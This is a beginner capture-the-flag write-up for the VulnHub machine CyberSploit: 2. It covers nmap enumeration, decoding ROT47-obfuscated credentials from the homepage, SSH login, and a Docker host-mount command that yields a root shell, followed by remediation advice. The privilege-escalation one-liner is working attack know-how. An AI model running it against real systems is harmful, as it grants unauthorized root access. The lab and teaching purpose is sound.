# CyberSploit: 2 Write-up

> **Platform:** VulnHub, [CyberSploit: 2](https://www.vulnhub.com/entry/cybersploit-2,507/) **Machine:** CyberSploit: 2 **Difficulty:** Beginner **Operating System:** CentOS Linux **Author:** Ctum

---

## Overview

CyberSploit: 2 is a very quick, beginner-friendly follow-up to the first box in the series. Credentials are displayed directly on the homepage, obfuscated with a classic substitution cipher (ROT47) rather than hashed or hidden behind any real access control. Privilege escalation is equally direct, relying on an unrestricted Docker installation that any local user can use to mount the host filesystem.

---
## Attack Path

1. Enumerated open services with Nmap.
2. Visited the site and found a username and password displayed directly on the homepage, obfuscated with a cipher.
3. Found a hint in the page source identifying the cipher as ROT47.
4. Decoded the credentials using an online ROT47 decoder.
5. Logged into SSH using the decoded credentials.
6. Found a hint file pointing toward Docker.
7. Used a known Docker privilege escalation technique from GTFOBins to mount the host filesystem and gain a root shell.
8. Retrieved the final flag.

---
## Initial Enumeration

```bash
nmap -A -T5 cybersploit2
```

```text
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 (centos)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: CyberSploit2
```

SSH and a web server running on CentOS. The TRACE method being flagged as potentially risky was noted but not needed for this box, since manual enumeration of the site proved more productive right away.

---
## Web Enumeration

Given how much the manual approach paid off on the first CyberSploit box, I started the same way here: visiting the site directly and checking the page source before running any automated tools.

The homepage displayed what looked like a username and password pair, but both were clearly scrambled, not in plain readable text:

```text
username: D92:=6?5C2
password: 4J36CDA=@:E
```

Checking the page source confirmed exactly what kind of obfuscation was in use:

```html
<!----------ROT47---------->
```

---
## Decoding the Credentials

ROT47 is a simple substitution cipher, a variant of ROT13 extended to cover a wider range of printable ASCII characters. Rather than implementing it manually, I used an online decoder:

`https://www.dcode.fr/rot-47-cipher`

Decoding both strings produced working credentials:

```text
username: shailendra
password: cybersploit1
```

---
## Gaining Shell Access

```bash
ssh shailendra@cybersploit2
```

The credentials worked immediately.

---
## Following the Hint

```bash
ls -la
cat hint.txt
```

The hint file contained a single word: **docker**. That was enough to point the next step directly at container-based privilege escalation rather than a broader SUID or kernel search.

---
## Privilege Escalation via Docker

A quick check on GTFOBins for Docker confirmed the exact technique needed. If a local user can run Docker (or is in the `docker` group), they can mount the entire host filesystem into a container and `chroot` into it, effectively bypassing any user-level restrictions entirely:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

Running this dropped straight into a root shell on the host, since the mounted filesystem was the real root filesystem rather than an isolated container environment.

---
## Final Flag

```bash
cd /root
```

```text
Pwned CyberSploit2 POC

share it with me twitter@cybersploit1

Thanks!
```

Machine complete.

---
## Flags Summary

|Flag|Location|How It Was Found|
|---|---|---|
|Final|`/root`|Retrieved after Docker-based privilege escalation|

CyberSploit: 2 does not use a multi-flag structure like the DC series. Credentials displayed on the homepage effectively served as the "flag" for the initial access stage.

---
## Remediation

- **Never display credentials directly on a public-facing page**, obfuscated or otherwise. ROT47 provides no real security, it is a well-known, instantly reversible cipher, not encryption.
- **Do not leave hints about obfuscation methods in page source comments.** Even without that hint, ROT47 is recognizable on sight to anyone with basic security experience.
- **Restrict Docker access to trusted administrative accounts only.** Any user able to run Docker, or who is a member of the `docker` group, has an effective path to full root access on the host, regardless of their actual account permissions.
- **Avoid running Docker as a service accessible to unprivileged users** unless rootless Docker or an equivalent isolation mechanism is properly configured.
- **Enforce strong, unique credentials for all accounts**, regardless of how "informational" a hint page might seem. `cybersploit1` as a password mirrors the previous box's flag format, a pattern that should never repeat in production credentials.

---
## Lessons Learned

- Manual inspection of a site, page source included, remains one of the fastest ways to find low-hanging fruit, even faster than automated tools in cases like this.
- Recognizing common ciphers on sight (ROT13, ROT47, base64, binary) saves significant time versus reaching for a tool before knowing what you are dealing with.
- A single-word hint file is often a direct and deliberate pointer, and should be treated as the primary lead rather than one data point among many.
- Docker privilege escalation is extremely fast once identified, and GTFOBins should be one of the first references checked whenever a hint mentions a specific service or binary by name.

---
## Tools Used

- Nmap
- Web browser (manual enumeration)
- dcode.fr ROT47 decoder
- SSH
- Docker
- GTFOBins

---
## Technologies Encountered

- Apache 2.4.37
- CentOS Linux
- OpenSSH 8.0
- Docker

---
## Skills Practiced

- Network Enumeration
- Manual Web Enumeration
- Cipher Recognition and Decoding (ROT47)
- SSH Access
- Docker Privilege Escalation